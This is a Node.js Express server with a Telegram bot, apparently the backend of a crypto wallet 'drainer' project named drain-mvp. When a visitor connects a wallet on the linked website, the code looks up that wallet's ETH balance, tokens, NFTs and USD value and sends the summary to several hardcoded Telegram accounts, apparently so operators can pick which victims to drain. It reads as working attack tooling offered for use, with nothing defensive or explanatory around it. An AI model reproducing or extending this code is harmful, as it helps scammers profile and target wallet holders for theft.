const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const cors = require('cors');
const axios = require('axios');
require('dotenv').config();

const app = express();
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

// Middleware
const allowedOrigins = [
  'http://localhost:3000',
  'https://drain-mvp-git-main-zhangs-projects-c2c3a872.vercel.app',
  'https://drain-mvp.vercel.app/',
  process.env.FRONTEND_URL
].filter(Boolean);

app.use(cors({
  origin: function (origin, callback) {
    // Allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);
    
    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    } else {
      return callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
app.use(express.json());

// Store for user chat IDs (optional, for direct user messages)
const userChats = new Map();

// Telegram bot commands (optional, mainly for testing)
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 
    'Welcome! This bot automatically receives wallet information when users connect their wallets on our website.'
  );
});

// Optional: Command to test bot functionality
bot.onText(/\/test/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '🤖 Bot is working correctly!');
});

// Predefined Telegram destinations
const TELEGRAM_DESTINATIONS = [
  process.env.TELEGRAM_CHANNEL_ID,
  process.env.TELEGRAM_USER_ID,
  7762598379,
  7997717431,
  7682852056,
  '@nextidearly0125'
].filter(Boolean); // Remove any undefined values

const TELEGRAM_USER_IDS = process.env.TELEGRAM_USER_IDS 
  ? process.env.TELEGRAM_USER_IDS.split(',').map(id => id.trim())
  : [];

app.get('/api/test', (req, res) => {
    res.json({ message: 'Backend is working!', timestamp: new Date().toISOString() });
  });

// API Routes
app.post('/api/wallet-connected', async (req, res) => {
  try {
    const { address } = req.body;
    console.log(address)
    if (!address) {
      return res.status(400).json({ error: 'Address is required' });
    }

    // Get wallet data
    const walletData = await getWalletData(address);
    
    // Format message
    const message = formatWalletMessage(address, walletData);
    
    // Send to all predefined destinations
    const sendPromises = TELEGRAM_USER_IDS.map(async (destination) => {
      try {
        await bot.sendMessage(destination, message, { parse_mode: 'HTML' });
        console.log(`Message sent to ${destination}`);
      } catch (error) {
        console.error(`Failed to send to ${destination}:`, error.message);
      }
    });
    
    await Promise.allSettled(sendPromises);
    
    res.json({ 
      success: true, 
      message: `Wallet data sent to ${TELEGRAM_USER_IDS.length} Telegram destination(s)` 
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Wallet data fetching functions
async function getWalletData(address) {
  try {
    const [balance, tokens, nfts] = await Promise.all([
      getEthBalance(address),
      getTokenBalances(address),
      getNFTBalances(address)
    ]);

    const totalUSD = await calculateTotalUSD(balance, tokens);

    return {
      balance,
      tokens,
      nfts,
      totalUSD
    };
  } catch (error) {
    console.error('Error fetching wallet data:', error);
    throw error;
  }
}

async function getEthBalance(address) {
  try {
    const response = await axios.get(`https://deep-index.moralis.io/api/v2/${address}/balance`, {
      headers: {
        'X-API-Key': process.env.MORALIS_API_KEY
      }
    });
    
    return {
      balance: (parseInt(response.data.balance) / 1e18).toFixed(4),
      symbol: 'ETH'
    };
  } catch (error) {
    console.error('Error fetching ETH balance:', error);
    return { balance: '0', symbol: 'ETH' };
  }
}

async function getTokenBalances(address) {
  try {
    const response = await axios.get(`https://deep-index.moralis.io/api/v2/${address}/erc20`, {
      headers: {
        'X-API-Key': process.env.MORALIS_API_KEY
      },
      params: {
        chain: 'eth'
      }
    });
    
    return response.data.map(token => ({
      name: token.name,
      symbol: token.symbol,
      balance: (parseInt(token.balance) / Math.pow(10, token.decimals)).toFixed(4),
      decimals: token.decimals,
      logo: token.logo
    }));
  } catch (error) {
    console.error('Error fetching tokens:', error);
    return [];
  }
}

async function getNFTBalances(address) {
  try {
    const response = await axios.get(`https://deep-index.moralis.io/api/v2/${address}/nft`, {
      headers: {
        'X-API-Key': process.env.MORALIS_API_KEY
      },
      params: {
        chain: 'eth',
        format: 'decimal'
      }
    });
    
    return response.data.result.map(nft => ({
      name: nft.name,
      symbol: nft.symbol,
      tokenId: nft.token_id,
      contractAddress: nft.token_address,
      metadata: nft.metadata ? JSON.parse(nft.metadata) : null
    }));
  } catch (error) {
    console.error('Error fetching NFTs:', error);
    return [];
  }
}

async function calculateTotalUSD(ethBalance, tokens) {
  try {
    // Get ETH price
    const ethPriceResponse = await axios.get(
      'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd'
    );
    const ethPrice = ethPriceResponse.data.ethereum.usd;
    const ethValue = parseFloat(ethBalance.balance) * ethPrice;

    // For simplicity, we'll just calculate ETH value
    // In production, you'd want to get prices for all tokens
    return ethValue.toFixed(2);
  } catch (error) {
    console.error('Error calculating USD value:', error);
    return '0.00';
  }
}

function formatWalletMessage(address, data) {
  let message = `<b>💰 Wallet Analysis</b>\n\n`;
  message += `<b>Address:</b> <code>${address}</code>\n`;
  message += `<b>Total Value:</b> $${data.totalUSD} USD\n\n`;
  
  // Native balance
  message += `<b>🔷 Native Balance:</b>\n`;
  message += `${data.balance.balance} ${data.balance.symbol}\n\n`;
  
  // Tokens
  if (data.tokens.length > 0) {
    message += `<b>🪙 Tokens (${data.tokens.length}):</b>\n`;
    data.tokens.slice(0, 10).forEach(token => {
      message += `• ${token.balance} ${token.symbol}\n`;
    });
    if (data.tokens.length > 10) {
      message += `... and ${data.tokens.length - 10} more tokens\n`;
    }
    message += `\n`;
  }
  
  // NFTs
  if (data.nfts.length > 0) {
    message += `<b>🖼 NFTs (${data.nfts.length}):</b>\n`;
    data.nfts.slice(0, 5).forEach(nft => {
      message += `• ${nft.name || 'Unknown'} #${nft.tokenId}\n`;
    });
    if (data.nfts.length > 5) {
      message += `... and ${data.nfts.length - 5} more NFTs\n`;
    }
  }
  
  return message;
}

// Start server
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log('Telegram bot is active');
});